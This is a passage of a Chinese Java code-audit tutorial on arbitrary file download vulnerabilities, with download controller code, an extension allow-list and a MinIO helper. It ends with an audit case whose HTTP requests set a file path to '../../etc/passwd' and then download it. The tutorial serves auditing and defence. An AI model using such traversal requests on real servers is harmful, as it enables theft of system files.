<span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[fis.available()];</span><br><span class="line">        fis.read(buffer);</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="comment">// 清空response</span></span><br><span class="line">        response.reset();</span><br><span class="line">        <span class="comment">// 设置response的Header</span></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">//Content-Disposition的作用：告知浏览器以何种方式显示响应返回的文件，用浏览器打开还是以附件的形式下载到本地保存</span></span><br><span class="line">        <span class="comment">//attachment表示以附件方式下载   inline表示在线打开   &quot;Content-Disposition: inline; filename=文件名.mp3&quot;</span></span><br><span class="line">        <span class="comment">// filename表示文件的默认名称，因为网络传输只支持URL编码的相关支付，因此需要将文件名URL编码后进行传输,前端收到后需要反编码才能获取到真正的名称</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(fullfilename, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="comment">// 告知浏览器文件的大小</span></span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + file.length());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(response.getOutputStream());</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        outputStream.write(buffer);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_ALLOWED_EXTENSION = &#123;</span><br><span class="line">        <span class="comment">// 图片</span></span><br><span class="line">        <span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>,</span><br><span class="line">        <span class="comment">// word excel powerpoint</span></span><br><span class="line">        <span class="string">&quot;doc&quot;</span>, <span class="string">&quot;docx&quot;</span>, <span class="string">&quot;xls&quot;</span>, <span class="string">&quot;xlsx&quot;</span>, <span class="string">&quot;ppt&quot;</span>, <span class="string">&quot;pptx&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;txt&quot;</span>,</span><br><span class="line">        <span class="comment">// 压缩文件</span></span><br><span class="line">        <span class="string">&quot;rar&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;gz&quot;</span>, <span class="string">&quot;bz2&quot;</span>,</span><br><span class="line">        <span class="comment">// 视频格式</span></span><br><span class="line">        <span class="string">&quot;mp4&quot;</span>, <span class="string">&quot;avi&quot;</span>, <span class="string">&quot;rmvb&quot;</span>,</span><br><span class="line">        <span class="comment">// pdf</span></span><br><span class="line">        <span class="string">&quot;pdf&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getFileType</span><span class="params">(String fileName)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">separatorIndex</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (separatorIndex &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fileName.substring(separatorIndex + <span class="number">1</span>).toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkAllowDownload</span><span class="params">(String resource)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 禁止目录上跳级别</span></span><br><span class="line">    <span class="keyword">if</span> (StrUtil.contains(resource, <span class="string">&quot;..&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查允许下载的文件规则</span></span><br><span class="line">    <span class="keyword">if</span> (ArrayUtil.contains(MimeTypeUtils.DEFAULT_ALLOWED_EXTENSION, getFileType(resource)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不在允许下载的文件规则</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-7.png"
+                      alt="img"
+                ></p>
+<h4 id="从远程服务器下载"><a href="#从远程服务器下载" class="headerlink" title="从远程服务器下载"></a>从远程服务器下载</h4><p>远程服务器即从OSS下载文件，从下载方式可控制文件名，但下载范围为此存储筒(可能存在越权下载)。以下以MinIo为例</p>
+<p>文件下载controller</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MinioUtil minioUtil;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/download5&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download5</span><span class="params">(String fileName, HttpServletResponse res)</span> &#123;</span><br><span class="line">    minioUtil.download(fileName,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MinioUtil</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MinioUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MinioConfig prop;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> MinioClient minioClient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(String fileName, HttpServletResponse res)</span> &#123;</span><br><span class="line">        <span class="type">GetObjectArgs</span> <span class="variable">objectArgs</span> <span class="operator">=</span> GetObjectArgs.builder().bucket(prop.getBucketName())</span><br><span class="line">                .object(fileName).build();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">GetObjectResponse</span> <span class="variable">response</span> <span class="operator">=</span> minioClient.getObject(objectArgs)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">FastByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastByteArrayOutputStream</span>()) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((len = response.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    os.write(buf, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line">                os.flush();</span><br><span class="line">                <span class="type">byte</span>[] bytes = os.toByteArray();</span><br><span class="line">                res.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="comment">// 设置强制下载不打开</span></span><br><span class="line">                <span class="comment">// res.setContentType(&quot;application/force-download&quot;);</span></span><br><span class="line">                res.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;fileName=&quot;</span> + fileName);</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">ServletOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> res.getOutputStream()) &#123;</span><br><span class="line">                    stream.write(bytes);</span><br><span class="line">                    stream.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功下载文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-8.png"
+                      alt="img"
+                ></p>
+<h2 id="三、实现中遇到的任意文件下载tips"><a href="#三、实现中遇到的任意文件下载tips" class="headerlink" title="三、实现中遇到的任意文件下载tips"></a>三、实现中遇到的任意文件下载tips</h2><p>某次审计过程中碰到一个任意文件下载漏洞，文件下载处通过id传参从数据库查询文件地址后对文件进行下载，故文件名不可控，但存在一个文件上传接口及文件名修改接口，文件上传接口存在白名单，故不可上传任意后缀文件无法造成目录穿越从而任意文件下载；但文件名修改处controller接收参数为开发自定义的xxxFile类，此处可重置数据库中相应数据，可利用..&#x2F;造成任意文件下载。</p>
+<p>具体代码如下（仅对代码逻辑进行说明）：</p>
+<p>文件修改controller,修改文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sysFile</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;updateStatus&quot;)</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">updateStatus</span><span class="params">(<span class="meta">@RequestBody</span> SysFile sysFile)</span>&#123;</span><br><span class="line">    <span class="type">SysFile</span> <span class="variable">update</span> <span class="operator">=</span> <span class="built_in">this</span>.sysFileService.update(sysFile);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>SysFile</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SysFile</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">28508902173852498L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long fileId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String fileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String fileUrl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String fileType;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String fileStatus;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">getFileId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fileId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileId</span><span class="params">(Long fileId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileId = fileId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileName</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileName = fileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileUrl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fileUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUrl</span><span class="params">(String fileUrl)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUrl = fileUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fileType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileType</span><span class="params">(String fileType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileType = fileType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileStatus</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fileStatus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileStatus</span><span class="params">(String fileStatus)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileStatus = fileStatus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getCreateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCreateTime</span><span class="params">(Date createTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下载文件代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;fileDownload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fileDownload</span><span class="params">(Long fileId, HttpServletResponse response, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SysFile</span> <span class="variable">sysFile</span> <span class="operator">=</span> sysFileService.queryById(fileId);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileUrl</span> <span class="operator">=</span> sysFile.getFileUrl();</span><br><span class="line">        <span class="keyword">if</span>(fileUrl.indexOf(<span class="string">&quot;./&quot;</span>) &gt; -<span class="number">1</span> || fileUrl.indexOf(<span class="string">&quot;.//&quot;</span>) &gt; -<span class="number">1</span> || fileUrl.indexOf(<span class="string">&quot;.\\&quot;</span>) &gt; -<span class="number">1</span> || fileUrl.indexOf(<span class="string">&quot;.\\/&quot;</span>) &gt; -<span class="number">1</span> || fileUrl.indexOf(<span class="string">&quot;./\\&quot;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> sysFile.getFileName();</span><br><span class="line">        String[] split = fileName.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> split[split.length - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>( !<span class="string">&quot;jpg&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;png&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;gif&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;rar&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;zip&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;pdf&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;doc&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;xls&quot;</span>.equals(type) &amp;&amp; !<span class="string">&quot;pdf&quot;</span>.equals(type) )&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;multipart/form-data&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,</span><br><span class="line">                <span class="string">&quot;attachment;fileName=&quot;</span> + FileUtils.setFileDownloadHeader(request, fileName));</span><br><span class="line">        FileUtils.writeBytes(fileUrl, response.getOutputStream());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<p>1、updateStatus接口发包修改指定fileId的SysFile中fileURL</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /api/system/sysFile/updateStatus HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxxxxxxxx</span><br><span class="line">Content-Length: <span class="number">92</span></span><br><span class="line">Accept: application/json, text/plain, *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Authorization: Bearer xxxxx</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Type: application/json;charset=UTF-8</span></span><br><span class="line"><span class="comment">Origin: http://xxxxxx</span></span><br><span class="line"><span class="comment">Referer: http://xxxxxx</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="comment">Cookie: Admin-Token=xxxxxx</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;fileId&quot;:36,&quot;fileStatus&quot;:&quot;0&quot;,&quot;fileUrl&quot;:&quot;../../../../../../../../../../../../../etc/passwd&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、fileDownload接口下载修改过的fileId文件即可任意文件下载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /api/system/sysFile/fileDownload?fileId=<span class="number">36</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxxxx</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">107.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://10.210.7.72:18080/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="comment">Cookie: xxxxx</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/downimage-9.png"
+                      alt="img"
+                ></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">java代码审计之任意文件下载漏洞</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">白给</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-04-15 15:48:06</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/04/15/java代码审计之任意文件下载漏洞/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/04/14/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">FastJSON反序列化漏洞解析</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">一、任意文件下载漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.</span> <span class="nav-text">二、任意文件下载漏洞代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">1、查找文件下载功能点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%AE%A1%E8%AE%A1%E4%B8%8B%E8%BD%BD%E5%8A%9F%E8%83%BD%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">2、审计下载功能代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.2.1.</span> <span class="nav-text">从本地服务器下载</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8F%AF%E6%8E%A7%E4%B8%94%E5%8F%AF%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">文件名可控且可进行目录穿越</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#new-File"><span class="nav-number">2.2.1.1.1.</span> <span class="nav-text">new File()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#getResouceAsStream"><span class="nav-number">2.2.1.1.2.</span> <span class="nav-text">getResouceAsStream()</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%8D%E5%8F%AF%E6%8E%A7"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">文件名不可控</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8F%AF%E6%8E%A7%E4%B8%8D%E5%8F%AF%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">2.2.1.3.</span> <span class="nav-text">文件名可控不可进行目录穿越</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" 